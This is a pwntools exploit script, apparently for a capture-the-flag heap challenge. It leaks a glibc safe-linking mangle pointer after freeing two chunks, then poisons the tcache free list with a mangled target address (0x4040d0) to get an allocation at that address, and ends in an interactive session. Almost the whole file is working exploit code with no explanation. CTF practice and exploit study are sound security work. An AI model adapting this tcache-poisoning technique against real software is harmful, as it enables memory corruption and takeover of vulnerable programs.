#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './main_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc host port'.split()

libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
        
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
        
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    
def malloc(x):
    p.sendline(b'1')
    p.sendline(str(x).encode())
def puts(x):
    p.sendline(b'2')
    p.sendline(str(x).encode())
def scanf(idx, x):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.sendline(x)
def free(x):
    p.sendline(b'4')
    p.sendline(str(x).encode())   

gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start()
sz = 64

malloc(sz) # 0
malloc(sz) # 1

free(0)
free(1)

# leak mangle pointer
p.clean()
puts(0)

a = ua(p.recvline_contains(b'Index: ').split()[-1])
mangle_pointer = a 
logx.mangle_pointer

# poison

target = 0x4040d0
mangled_target = target ^ mangle_pointer

logx.mangled_target
# pause()
scanf(1, p64(mangled_target))
malloc(sz) 
malloc(sz) 
scanf(3, b'adamadam')
scanf(2, b'adamadam')
# puts(5)


p.interactive()
